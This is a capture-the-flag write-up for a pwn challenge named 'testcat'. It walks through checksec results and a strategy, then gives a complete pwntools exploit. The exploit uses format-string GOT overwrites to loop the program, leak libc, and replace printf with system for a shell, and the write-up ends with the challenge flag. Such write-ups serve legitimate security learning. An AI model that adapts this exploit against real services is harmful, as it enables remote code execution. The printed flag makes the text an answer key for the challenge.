# testcat
- 992 points
- did not solve at the time

Description
---
While scanning one of APOCALYPSE's internal systems, we managed to find a pretty barebone service named "testcat". Based on our intel, they're using it on their systems to check if their netcat command works. Can you try to get a shell on their testcat server? If you do manage to compromise their service, submit the flag on their system as proof!

Interact with the service at:
chals.cyberthon22f.ctf.sg:10401

P.S. This may be of some use to you: https://libc.rip/

Note: once you get a shell, the flag.txt can be found in the user's home directory.

Files: [testcat](./testcat)

Solution
---
There are multiple approaches to this challenge, since it is vulnerable to both format string and buffer overflow.

First things first,
```
$ checksec testcat
[*] '/[redacted]/testcat'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
- canary means immediately overwriting the rip is impossible.
  - for format string, this would not be an issue and in fact we would be using this to overcome a seperate problem
  - for bof, this will have to be handled before a ret2libc rop chain
- NX (non-executable) means that the stack is not executable.
  - for fmtstr, the program needs to repeat at least once to leak the libc base before sending in the final got write (possible thanks to partial relro)
  - rop chain once canary is overcome

there is also partial RELRO which allows for the global offset table to be overwritten

STRATEGY:
1) first i need to make the program repeat. typically there would be an exit() func but here the program terminates with a return call, and the canary makes it so you can't immediately perform bof
2) there's the fmtstr approach and the bof approach
3) pick one
  - buffer overflow: (1)overwrite the fini_array, leak canary, leak libc, (2) send payload
  - format string: (1) overwrite checkstack got with main, repeat program indefinitely, (2) leak libc, (3) send payload

one thing to note is that `__stack_chk_fail` has 2 underscores and it might be difficult to tell if there are more than 2

not salty by my waste of time at all

```python
from pwn import *
context.log_level='debug'

### DECLARE ###
BINARY = "./testcat"
URL = "chals.cyberthon22f.ctf.sg"
PORT = 10401
PROMPT = "=> "
MARKER = "RECEIVED:\n"
WRITE_FMT_OFFSET = 6

### SETUP ###
elf = context.binary = ELF(BINARY)
rop = ROP(BINARY)
p = remote(URL, PORT)

### part 1, make it repeat ###

payload1 = flat(
	fmtstr_payload(WRITE_FMT_OFFSET, {elf.got.__stack_chk_fail:elf.symbols.main}),
	"A"*280
)

p.sendlineafter(PROMPT, payload1)

### part 2, leak libc addresses ###

payload2a = flat(
	f"%{WRITE_FMT_OFFSET+1}$sAAAA",
	elf.got['printf'],
	"A"*280 #trigger canary
)

p.sendlineafter(PROMPT, payload2a)

p.recvuntil(MARKER)
printf_libc = u64(p.recvuntil('AAAA', drop=True).strip().ljust(8, b"\x00")) # standard
log.success("libc printf is: " + hex(printf_libc))

payload2b = flat(
	f"%7$sAAAA",
	elf.got['puts'],
	"A"*280 #trigger canary
)

p.sendlineafter(PROMPT, payload2b)

p.recvuntil(MARKER)
puts_libc = u64(p.recvuntil('AAAA', drop=True).strip().ljust(8, b"\x00")) # standard
log.success("libc puts is: " + hex(puts_libc))

### part 3, declare libc and overwrite printf with system ###

libc = ELF("./libc6_2.33-0ubuntu5_amd64.so")

libc_base = puts_libc - libc.symbols['puts']
log.info("libc base is " + hex(libc_base))

libc_system = libc_base + libc.symbols['system']
log.info("libc_system is " + hex(libc_system))

payload3 = flat(
	fmtstr_payload(WRITE_FMT_OFFSET, {elf.got['printf']:libc_system}),
	"A"*280
)

p.sendlineafter(PROMPT, payload3)

payload4 = "/bin/sh\x00"
p.sendline(payload4)

p.interactive()
```

`Cyberthon{w3LL_1_gu355_y0u_c0uLd_54y_t35tc4t_w45_4_C4T45tr0ph3}`


